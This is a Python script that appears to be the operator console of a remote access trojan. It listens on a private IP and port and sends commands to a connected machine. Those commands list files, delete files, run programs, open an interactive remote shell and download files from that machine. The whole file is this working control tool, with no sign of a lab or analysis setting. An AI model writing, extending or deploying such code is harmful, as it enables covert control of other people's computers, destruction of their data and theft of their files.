import os
import socket

s= socket.socket()

host = socket.gethostbyname("192.168.77.108")
port = 8082

s.bind((host,port))

print(":the server is starteddd")

print("waiting for the connections")

s.listen(5)

conn,addr = s.accept()

print(addr, "has connected o the server buddy")

while 1:

    command = input(str("command>> "))
    if command == "view":
        conn.send(command.encode())
        print("")
        print("comand has been sended there\n\n")
        files = conn.recv(5000)
        files = files.decode()
        print(files)
        print("\n\nthe command has beeen executed successfully")
    elif command == "ls":
        conn.send(command.encode())
        print("command has beeen sended\n\n")
        files = conn.recv(5000)
        files = files.decode()
        print(files)

    elif command == '..':
        conn.send(command.encode())
        result = conn.recv(5000)
        result = result.decode()
        print(result)

    elif command == 'rm':
        conn.send(command.encode())
        path= input(str("enter the path with file name::"))
        conn.send(path.encode())
        print("sended")
        result = conn.recv(5000)
        result = result.decode()
        print(result)

    elif command == 'run':
        conn.send(command.encode())
        arg1= input(str("enter the arg1:"))
        conn.send(arg1.encode())
        print("sended")
        arg2 = input(str("enter the arg2:"))
        conn.send(arg2.encode())
        print("\n\n")
        result = conn.recv(5000)
        result = result.decode()
        print(result)


    elif command == "shell":
        conn.send(command.encode())
        print("Shell has been created")
        while 1:
            shell = input("shell>>")
            if shell == "exit":
                exit= "exit"
                conn.send(exit.encode())
                break
            else:
                conn.send(shell.encode())
                print("------sended---")
                result = conn.recv(5000)
                result= result.decode()
                print(result)

    elif command == "download_file":
        conn.send(command.encode())
        file_path = input(str("enter the file path::"))
        conn.send(file_path.encode())
        file = conn.recv(100000)
        print("file received")
        filename = input("enter the file name:")
        newfile = open(filename, "wb")
        newfile.write(file)
        newfile.close()
        print("file has been sended")